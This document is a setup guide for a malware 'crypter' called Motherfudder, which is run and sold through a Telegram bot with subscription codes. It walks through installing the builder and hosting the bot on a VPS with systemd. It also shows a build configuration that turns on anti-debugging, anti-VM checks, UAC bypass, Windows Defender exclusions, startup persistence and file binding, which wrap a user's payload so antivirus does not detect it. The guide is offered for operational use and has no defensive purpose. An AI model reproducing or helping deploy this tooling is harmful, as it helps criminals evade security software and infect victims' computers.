# Setup Guide - Motherfudder Crypter

**Complete Setup Instructions** | **30 Minutes to Production** | **100% Automated**

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Prerequisites](#prerequisites)
3. [Automated Setup](#automated-setup)
4. [Telegram Bot Setup](#telegram-bot-setup)
5. [CLI Mode Setup](#cli-mode-setup)
6. [Troubleshooting](#troubleshooting)
7. [Next Steps](#next-steps)

---

## Quick Start

### Windows (Recommended)

```batch
# Step 1: Download the project
git clone https://github.com/your-repo/motherfudder-enhanced
cd motherfudder-enhanced

# Step 2: Run control panel (as Administrator)
Right-click MOTHERFUDDER.bat ? Run as Administrator

# Step 3: Follow the menu
Press 1 ? Install Prerequisites (wait 30 mins)
Press 2 ? Configure Bot
Press 3 ? Host Bot

# Done!
```

**Total Time**: Approximately 30 minutes (mostly automated)

---

## Prerequisites

### System Requirements

- **OS**: Windows 10/11 (64-bit)
- **RAM**: 4 GB minimum
- **Disk**: 2 GB free space
- **Network**: Internet connection

### Required Software (Auto-Installed)

The control panel (`MOTHERFUDDER.bat`) installs:

- Chocolatey (package manager)
- Rust + Cargo (programming language)
- .NET SDK 6.0 (runtime)
- Visual Studio Build Tools (compiler)
- OpenSSL (cryptography)
- Git (version control)

**No manual installation required.**

---

## Automated Setup

### Option 1: MEGA Control Panel (Recommended)

1. **Launch Control Panel**:
   ```batch
   Right-click MOTHERFUDDER.bat ? Run as Administrator
   ```

2. **Install Prerequisites** (Option 1):
   - Installs all dependencies automatically
   - Takes 10-30 minutes depending on internet speed
   - Requires Administrator privileges
   - Shows progress for each package

3. **Important**: After installation completes, close the terminal and open a **new** Command Prompt. This ensures environment variables are loaded.

### Option 2: Manual Installation

See [docs/INSTALLATION.md](docs/INSTALLATION.md) for manual installation instructions.

---

## Telegram Bot Setup

### Step 1: Create Bot

1. Open Telegram
2. Search for `@BotFather`
3. Send `/newbot`
4. Follow the prompts:
   - **Bot name**: Motherfudder Crypter
   - **Bot username**: YourName_MfCrypter_bot
5. Copy the bot token (format: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### Step 2: Configure Bot

**Using Control Panel** (Recommended):

```batch
MOTHERFUDDER.bat ? Press 2

Enter bot token: [paste your token]
Change authentication key? (Y/N): N
```

**Manual Configuration**:

Create `MfBuilder/.env`:
```
TELOXIDE_TOKEN=YOUR_BOT_TOKEN_HERE
```

### Step 3: Customize Subscription Codes (Optional)

Edit `MfBuilder/src/telegram_bot.rs`:

```rust
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "YOUR-CODE-1",
    "YOUR-CODE-2",
    "YOUR-CODE-3",
];
```

### Step 4: Host Bot

**Using Control Panel**:

```batch
MOTHERFUDDER.bat ? Press 3

Choose hosting mode:
  [1] Foreground (testing)
  [2] Background (production)
  [3] Back

Choice [1-3]: 1
```

**Manual Hosting**:

```batch
cd MfBuilder
cargo run --release -- --bot
```

### Step 5: Test Bot

1. Open Telegram
2. Search for your bot
3. Send `/start`
4. Verify the interactive menu appears
5. Test "Redeem Code" with your configured codes

---

## CLI Mode Setup

### Step 1: Configure Build Options

Edit `MfBuilder/build.json`:

```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": false,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": false,
    "defender_exclusion": true,
    "defender_exclude_drive": false,
    "binder": false
}
```

### Step 2: Prepare Payload

```batch
# Copy your payload to MfBuilder directory
copy your_payload.exe MfBuilder\payload.exe
```

### Step 3: Build

**Using Control Panel**:

```batch
MOTHERFUDDER.bat ? Press 4
```

**Manual Build**:

```batch
cd MfBuilder
cargo run --release
```

### Step 4: Retrieve Output

Output files are created in `MfBuilder/`:
- **BAT mode**: `out.bat`
- **EXE mode**: `out.exe`

---

## Troubleshooting

### OpenSSL Not Found

**Problem**: `Could not find OpenSSL installation`

**Solution**:
```batch
MOTHERFUDDER.bat ? Press 1
# Reinstall all prerequisites
```

Or manually:
```batch
choco install openssl -y
```

### Bot Not Responding

**Problem**: Bot doesn't reply to `/start`

**Checklist**:
1. Is bot running? Check `MOTHERFUDDER.bat ? Press 3`
2. Is token correct? Check `MfBuilder/.env`
3. Is token valid? Verify in @BotFather

**Solution**:
```batch
MOTHERFUDDER.bat ? Press 2
# Reconfigure with correct token
```

### Build Fails

**Problem**: `cargo: command not found`

**Solution**: Close terminal and open a **new** one
```batch
# Close current Command Prompt
# Open NEW Command Prompt (as Admin)
# Try again
```

**Problem**: `MSBuild not found`

**Solution**:
```batch
MOTHERFUDDER.bat ? Press 1
# Reinstall Visual Studio Build Tools
```

### Subscription Code Invalid

**Problem**: Bot says "Invalid Code"

**Solution**: Verify codes in `MfBuilder/src/telegram_bot.rs`:

```rust
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "YOUR-CODE-HERE",  // Match this exactly
];
```

Rebuild bot:
```batch
cd MfBuilder
cargo build --release
```

Restart bot:
```batch
MOTHERFUDDER.bat ? Press 3
```

---

## Next Steps

### After Setup

1. **Test the Bot**:
   - Send `/start` command
   - Redeem a test subscription code
   - Upload a test binary
   - Configure options via buttons
   - Build and download result

2. **Customize**:
   - Add your subscription codes
   - Update support contact info
   - Customize FAQ responses
   - Adjust build defaults

3. **Deploy** (Optional):
   - Host bot on VPS for 24/7 operation
   - Configure systemd service (Linux)
   - Set up auto-restart on failure

4. **Read Documentation**:
   - [Features Guide](docs/FEATURES.md)
   - [Bot Setup Details](docs/BOT_SETUP.md)
   - [UAC Bypass Info](docs/UAC_BYPASS_INFO.md)
   - [Defender Exclusion](docs/DEFENDER_EXCLUSION_INFO.md)

---

## VPS Deployment (Optional)

### For 24/7 Bot Hosting

**Linux VPS**:

```bash
# Install dependencies
sudo apt update
sudo apt install -y pkg-config libssl-dev build-essential

# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Clone project
git clone https://github.com/your-repo/motherfudder-enhanced
cd motherfudder-enhanced/MfBuilder

# Configure
nano .env  # Add TELOXIDE_TOKEN

# Build and run
cargo build --release
cargo run --release -- --bot
```

**systemd Service** (Linux):

Create `/etc/systemd/system/mf-bot.service`:

```ini
[Unit]
Description=Motherfudder Crypter Bot
After=network.target

[Service]
Type=simple
User=your-user
WorkingDirectory=/path/to/motherfudder-enhanced/MfBuilder
ExecStart=/home/your-user/.cargo/bin/cargo run --release -- --bot
Restart=always

[Install]
WantedBy=multi-user.target
```

Enable and start:

```bash
sudo systemctl enable mf-bot
sudo systemctl start mf-bot
sudo systemctl status mf-bot
```

---

## Verification Checklist

### Telegram Bot

- [ ] Bot responds to `/start`
- [ ] Interactive buttons are clickable
- [ ] Redeem code system works
- [ ] Subscription status displays correctly
- [ ] File upload works
- [ ] Configuration toggles function
- [ ] Build process completes
- [ ] Crypted binary downloads successfully

### CLI Mode

- [ ] `cargo run --release` executes
- [ ] Binary type is detected
- [ ] Build completes without errors
- [ ] Output file is created
- [ ] Output file runs correctly

### Control Panel

- [ ] All menu options are accessible
- [ ] Prerequisites install successfully
- [ ] Bot configuration wizard works
- [ ] Bot hosting options function
- [ ] Update checker works

---

## Support

### Documentation

- [Full Documentation Index](docs/DOCUMENTATION_INDEX.md)
- [FAQ](docs/BOT_PREVIEW.md#faq)
- [Troubleshooting](docs/INSTALLATION.md#troubleshooting)

### Contact

- **Telegram**: @YourSupportBot
- **GitHub Issues**: Report bugs and issues
- **Documentation**: Check docs folder first

---

## Summary

**Automated Setup**:
1. Run `MOTHERFUDDER.bat` as Admin
2. Press 1 ? Install everything (30 mins)
3. Press 2 ? Configure bot (2 mins)
4. Press 3 ? Host bot (instant)
5. Done!

**Manual Setup**: See [docs/INSTALLATION.md](docs/INSTALLATION.md)

**Total Time**: 30 minutes (mostly automated)

**Result**: Production-ready crypter with interactive Telegram bot

---

**Version**: 1.0.0 | **Status**: Production Ready | **Support**: Full documentation available
